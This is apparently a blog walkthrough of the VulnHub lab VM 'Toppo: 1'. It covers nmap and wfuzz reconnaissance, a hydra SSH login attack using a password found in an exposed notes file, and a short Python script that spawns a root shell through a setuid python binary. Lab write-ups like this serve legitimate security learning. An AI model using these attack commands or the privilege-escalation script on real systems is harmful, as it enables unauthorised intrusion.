---
layout: post
date: 2018-08-17 19:04:17 +0000
title: "Toppo: 1 Walkthrough"
subtitle: "Hakaishin Toppo?"
category: Walkthrough
tags: [VulnHub, Toppo]
comments: true
image:
  feature: toppo-1-walkthrough.jpg
  credit: Thomas-Suisse / Pixabay
  creditlink: https://pixabay.com/en/bomb-background-pattern-explode-1185726/
---

This post documents the complete walkthrough of Toppo: 1, a boot2root [VM][1] created by [Hadi Mene][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

There's no backstory for this VM. All we know is that it isn't hard to pwn and doesn't require advanced exploitation. The one "Toppo" I know is a character from Dragon Ball Super–God of Destruction candidate from Universe 11 :laughing:

### Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.130
...
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc (DSA)
|   2048 89:99:c4:54:9a:18:66:f7:cd:8e:ab:b6:aa:31:2e:c6 (RSA)
|   256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d (ECDSA)
|_  256 39:d9:79:26:60:3d:6c:a2:1e:8b:19:71:c0:e2:5e:5f (ED25519)
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Clean Blog - Start Bootstrap Theme
111/tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          33198/udp  status
|_  100024  1          58751/tcp  status
58751/tcp open  status  syn-ack ttl 64 1 (RPC #100024)
```

`nmap` finds `22/tcp`, `80/tcp`, `111/tcp`, and `58751/tcp` open. As usual, I'll go for the web one first. Here's how it looks like.

![Clean Blog](/assets/images/posts/toppo-1-walkthrough/460c48a6.png)

### Directory/File Enumeration

I like `wfuzz` a lot. When it's combined with a quality wordlist like the ones in SecLists, you can uncover directories and files that will point you in the next direction.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20 --hc 404 http://192.168.30.130/FUZZ
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://192.168.30.130/FUZZ
Total requests: 4593

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000011:  C=403     11 L	      32 W	    298 Ch	  ".htaccess"
000010:  C=403     11 L	      32 W	    293 Ch	  ".hta"
000012:  C=403     11 L	      32 W	    298 Ch	  ".htpasswd"
000190:  C=200     21 L	     172 W	   1093 Ch	  "LICENSE"
000437:  C=301      9 L	      28 W	    316 Ch	  "admin"
001232:  C=301      9 L	      28 W	    314 Ch	  "css"
002073:  C=301      9 L	      28 W	    314 Ch	  "img"
002094:  C=200    183 L	     465 W	   6437 Ch	  "index.html"
002250:  C=301      9 L	      28 W	    313 Ch	  "js"
002463:  C=301      9 L	      28 W	    315 Ch	  "mail"
002497:  C=301      9 L	      28 W	    317 Ch	  "manual"
003597:  C=403     11 L	      32 W	    302 Ch	  "server-status"
004261:  C=301      9 L	      28 W	    317 Ch	  "vendor"
```

Following the hint in `LICENSE`, it's not long before I found Blackrock Digital's GitHub [repository](https://github.com/BlackrockDigital/startbootstrap-clean-blog) for this BootStrap theme in Google.

![LICENSE](/assets/images/posts/toppo-1-walkthrough/727f2d5a.png)

Everything was identical to those listed in the repository except for `/admin`.

![/admin](/assets/images/posts/toppo-1-walkthrough/4bc414d0.png)

![/admin/notes.txt](/assets/images/posts/toppo-1-walkthrough/532aac6c.png)

### Hail Hydra

I also like `hydra` a lot. It's always my go-to weapon of choice for online password cracking and user validation. Let's give it a shot.

```
# hydra -L usernames.txt -p 12345ted123 -f -e nsr -o hydra.txt -t 4 ssh://192.168.30.130)
[22][ssh] host: 192.168.30.130   login: ted   password: 12345ted123
```

What's in `usernames.txt`, you ask?

```
# cat usernames.txt
root
admin
test
guest
info
adm
mysql
user
administrator
oracle
ftp
toppo
ted
```

I added `toppo` and `ted` for obvious reasons—`toppo` is the name of the VM while `ted` appears in `/admin/notes.txt`.

### Low-Privilege Shell

Now that I have the password of `ted`, let's log in to his SSH account.

![ted](/assets/images/posts/toppo-1-walkthrough/5603610a.png)

### Privilege Escalation

Again, using basic enumeration, I soon found the ticket to privilege escalation.

![python2.7](/assets/images/posts/toppo-1-walkthrough/7558c05c.png)

Since I have a `python` that's `setuid` to `root`, I can write a Python script like this.

<div class="filename"><span>makemeroot.py</span></div>

```python
import os

os.setuid(0)
os.setgid(0)
os.system("/bin/bash")
```

![root](/assets/images/posts/toppo-1-walkthrough/b08a64c9.png)

### Where's the Flag (WTF)

With `root`, getting the flag is trivial.

![Flag](/assets/images/posts/toppo-1-walkthrough/af5a0e51.png)

:dancer:

[1]: https://www.vulnhub.com/entry/toppo-1,245/
[2]: https://twitter.com/@h4d3sw0rm
[3]: https://www.vulnhub.com/
